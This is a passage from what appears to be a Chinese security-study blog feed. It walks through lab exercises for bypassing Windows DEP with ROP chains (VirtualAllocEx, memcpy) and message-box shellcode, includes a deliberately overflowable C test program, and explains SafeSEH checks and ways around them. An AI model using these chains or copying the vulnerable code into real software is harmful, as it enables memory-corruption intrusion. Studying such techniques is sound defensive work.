alt="image-20220626165428530"></p><p>接下来，只要在这个位置（0x0012FEA8）填上申请的可执行内存空间起始地址（0x00030000），就能转入该区域执行。</p><p>由上图可知，复制的源内存地址为 0x0012FEB4，就是 memcpy 函数的复制长度参数所在位置，所以只要在它后面接弹出对话框的机器码就行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy 函数切入点;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br></pre></td></tr></table></figure><p>运行结果，并没有弹出我们预想的 ”failwest“ 对话框。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626170404322-165629394983632.png" alt="image-20220626170404322"></p><p>因为memcpy 函数复制过来的不只是弹出对话框的机器码，还包含着弹出对话框机器码前面的一些指令和参数，而这些东西会破坏程序的执行。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626172315190-165629394983633.png" alt="image-20220626172315190"></p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626170532058-165629394983634.png" alt="image-20220626170532058"></p><p>最终 shellcode 如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//CALL VirtualAllocEx 地址</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址 0x00030000</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小 0xFF</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型 0x1000</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型 0x40</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，转入执行用</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，复制用</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x90\x90\x94&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span>;</span><br></pre></td></tr></table></figure><p>首先是对 ESI 和 EDI 指向内存的操作，在 0x00030004 和 0x00030005 分别对 ESI 和 EDI 指向的内存有读取操作，我们需要保证 ESI 和 EDI 指向合法的位置。 ESI 和 EDI 是在 memcpy 函数返回前被 POP 进去的。</p><p>接下来是 0x00030006 的 XCHG EAX,EBP 指令，这条指令直接破坏了 ESP，而在弹出对话框的机器码中有 PUSH 操作，所以 ESP 要修复，故我们在弹出对话框的机器码前边使用 0x94 填充，在 0x00030013 处来修复这个问题。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626180652350-165629394983935.png" alt="image-20220626180652350"></p><p>最后是 0x0003000F 的对[EAX]操作，如果 0x00030010 处使用 0x90 填充，结果就是对[EAX+0x909094FC]操作，这会引发异常，所以我们使用 0x00 填充 0x00030010，避免出现异常。</p><blockquote><p>实际上我们有种更简单的方法来处理掉这些垃圾指令，从上图中大家可以看到我们弹出对话框的机器码起始地址为 0x00030008，我们可以让 memcpy 函数返回时直接跳转到这个位置，跃过前边的垃圾指令。</p></blockquote><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626180928314-165629394984036.png" alt="image-20220626180928314"></p><h1 id="利用可执行内存挑战-dep"><a class="markdownIt-Anchor" href="#利用可执行内存挑战-dep"></a> 利用可执行内存挑战 DEP</h1><p>有的时候在进程的内存空间中会存在一段可读可写可执行的内存，如果我们能够将 shellcode 复制到这段内存中，并劫持程序流程，我们的 shellcode 就有执行的机会。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626181911817-165629394984037.png" alt="image-20220626181911817"></p><p>这个实验与上一节的利用 VirtualAlloc 相似，只不过这次实验利用的是已经存在的可读可写可执行的内存空间，而上一节的实验是我们利用的是通过 VirtualAlloc() 函数创造的内存空间。所以这个实验与上一节实验基本相同，在此就不过多介绍。</p><h2 id="源码"><a class="markdownIt-Anchor" href="#源码"></a> 源码：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x08\x00\x14\x00&quot;</span><span class="comment">//可执行内存中弹出对话框机器码的起始地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x14\x00&quot;</span><span class="comment">//可执行内存空间地址，复制用</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x61\x30\x5F\x5F\x68\x68\x75\x31\x79\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> tt[<span class="number">176</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(tt,shellcode,<span class="number">450</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line"><span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;dep-机制的保护原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#dep-机制的保护原理&quot;&gt;&lt;/a&gt; DEP 机制的保护原理&lt;/h1&gt;
&lt;p&gt;溢出攻击的&lt;strong&gt;根源&lt;/strong&gt;在于计算机未明确</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="DEP" scheme="https://www.rgzzplus.com/tags/DEP/"/>
    
  </entry>
  
  <entry>
    <title>亡羊补牢：SafeSEH</title>
    <link href="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/"/>
    <id>https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/</id>
    <published>2022-06-09T11:31:34.000Z</published>
    <updated>2022-08-01T11:15:21.724Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="safeseh-对异常处理的保护原理"><a class="markdownIt-Anchor" href="#safeseh-对异常处理的保护原理"></a> SafeSEH 对异常处理的保护原理</h1><h2 id="safeseh的原理"><a class="markdownIt-Anchor" href="#safeseh的原理"></a> SafeSEH的原理</h2><p>在程序调用异常处理函数前，对要调用的异常处理函数进行一系列的有效性校验，当发现异常处理函数不可靠时终止异常处理函数的调用。SafeSEH 需要操作系统和编译器的双重支持，二者缺一都会降低 SafeSEH 的保护能力。</p><h3 id="编译器在safeseh-机制中所做的工作"><a class="markdownIt-Anchor" href="#编译器在safeseh-机制中所做的工作"></a> 编译器在SafeSEH 机制中所做的工作</h3><p>启用/SafeSEH 链接选项后，编译器在编译程序的时候将程序所有的异常处理函数地址提取出来，编入一张安全 S.E.H 表，并将这张表放到程序的映像中。当程序调用异常处理函数的时候，会将函数地址与安全 S.E.H 表进行匹配，检查调用的异常处理函数是否位于安全 S.E.H 表中。</p><p>比较同一段代码在 VC++ 6. 0 （没有SafeSEH机制）和 VS 2008（有SafeSEH机制）分别编译后安全 S.E.H 表的区别。VS 2008 在编译程序时将程序中的异常处理函数的地址提取出来放到安全 S.E.H 表中。<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605173356294.png" alt="image-20220605173356294"></p><h3 id="操作系统在safeseh机制中的作用"><a class="markdownIt-Anchor" href="#操作系统在safeseh机制中的作用"></a> 操作系统在SafeSEH机制中的作用</h3><p>通过前面（文章《形形色色的内存攻击技术》中）对S.E.H的的介绍，我们知道异常处理函数的调用是通过 RtlDispatchException()函数处理实现的，SafeSEH机制也是从这里开始的。</p><p>保护措施：</p><p>（1）检查<strong>异常处理链</strong>是否位于当前程序的栈中，如下图所示。如果不在当前栈中，程序将终止异常处理函数的调用。<br><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605174009415.png" alt="image-20220605174009415"></p><p>（2）检查<strong>异常处理函数的指针</strong>是否指向当前程序的栈中，如上图所示。如果指向当前栈中，程序将终止异常处理函数的调用。</p><p>（3）在前面两项检查都通过后，程序调用 RtlIsValidHandler()，来对异常处理函数的有效性进行验证。</p><h4 id="rtlisvalidhandler-都做了哪些工作呢"><a class="markdownIt-Anchor" href="#rtlisvalidhandler-都做了哪些工作呢"></a> RtlIsValidHandler() 都做了哪些工作呢？</h4><p><img src="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605174617111.png" alt="image-20220605174617111"></p><p>首先，该函数判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，校验函数将依次进行如下校验。</p><p>（ 1）判断程序是否设置了 IMAGE_DLLCHARACTERISTICS_NO_SEH 标识。如果设置了这个标识，这个程序内的异常会被忽略，函数直接返回校验失败。<br>（ 2）检测程序是否包含安全 S.E.H 表。如果程序包含安全 S.E.H 表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。<br>（ 3）判断程序是否设置 ILonly 标识。如果设置了这个标识，<a href="http://xn--uirrueg070benjhh4a8d0anda.NET">说明该程序只包含.NET</a> 编译人中间语言，函数直接返回校验失败。<br>（ 4）判断异常处理函数地址是否位于不可执行页（ non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校验成功，否则程序抛出访问违例的异常。</p><p>如果异常处理函数的地址没有包含在加载模块的内存空间，校验函数将直接进行 DEP 相关检测，函数依次进行如下校验。<br>（ 1）判断异常处理函数地址是否位于不可执行页（ non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测 DEP 是否开启，如果系统未开启 DEP 则返回校验成功，否则程序抛出访问违例的异常。<br>（ 2）判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败。</p><p>RtlIsValidHandler()函数的伪代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">RtlIsValidHandler</span><span class="params">(handler)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (handler is in an image) &#123; <span class="comment">//在加载模块内存空间内</span></span><br><span class="line"><span class="keyword">if</span> (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag <span class="built_in">set</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="keyword">if</span> (image has a SafeSEH table)&#123; <span class="comment">//含有安全 S.E.H 表，说明程序启用 SafeSEH</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)<span class="comment">//异常处理函数地址出现在安全 S.E.H 表中</span></span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span> (image is a .NET assembly with the ILonly flag <span class="built_in">set</span>) <span class="comment">//只包含 IL</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is on a non-executable page) &#123; <span class="comment">//跑到不可执行页上了</span></span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">//DEP 关闭</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION; <span class="comment">//抛出访问违例异常</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is not in an image) &#123; <span class="comment">//在加载模块内存之外，并且在可执行页上</span></span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable bit <span class="built_in">set</span> in the process flags)</span><br><span class="line">            <span class="comment">//允许在加载模块内存空间外执行</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE; <span class="comment">//前面条件都不满足的话只能允许这个异常处理函数执行了</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RtlIsValidHandler() 函数在哪些情况下允许异常处理函数执行？<br>（ 1）异常处理函数位于加载模块内存范围之外， DEP 关闭。<br>（ 2）异常处理函数位于加载模块内存范围之内，相应模块未启用 SafeSEH（安全 S.E.H 表为空），同时相应模块不是纯 IL。<br>（ 3）异常处理函数位于加载模块内存范围之内，相应模块启用 SafeSEH（安全 S.E.H 表不为空），异常处理函数地址包含在安全 S.E.H 表中。</p><p>我们来分析一下这三种情况攻击成功的可行性。<br>（ 1）现在我们只考虑 SafeSEH，不考虑 DEP，针对 DEP 的讨论我们放到下一节中。排除DEP 干扰后，我们只需在加载模块内存范围之外找到一个跳板指令就可以转入 shellcode 执行，这点还是比较容易实现的。<br>（ 2）在第二种情况中，我们可以利用未启用 SafeSEH 模块中的指令作为跳板， 转入 shellcode 执行，这也是为什么我们说 SafeSEH 需要操作系统与编译器的双重支持。在加载模块中找到一个未启用的 SafeSEH 模块也不是一件很困难的事情。<br>（ 3）这种情况下我们有两种思路可以考虑，一是清空安全 S.E.H 表，造成该模块未启用SafeSEH 的假象；二是将我们的指令注册到安全 S.E.H 表中。由于安全 S.E.H 表的信息在内存中是加密存放的，所以突破它的可能性也不大，这条路我们就先放弃吧。</p><p>通过以上分析可以得出结论：突破 SafeSEH 还是可以做到的。您可能会问这些方法貌似有点复杂，有没有更为简便的方法突破呢？很负责地告诉您，有两种更为简便直接方法可以突破 SafeSEH。<br>（ 1）不攻击 S.E.H（太邪恶了），可以考虑覆盖返回地址或者虚函数表等信息。<br>（ 2）利用 S.E.H 的终极特权！这种安全校验存在一个严重的缺陷——如果 S.E.H 中的异常函数指针指向堆区，即使安全校验发现了 S.E.H 已经不可信，仍然会调用其已被修改过的异常处理函数，因此只要将 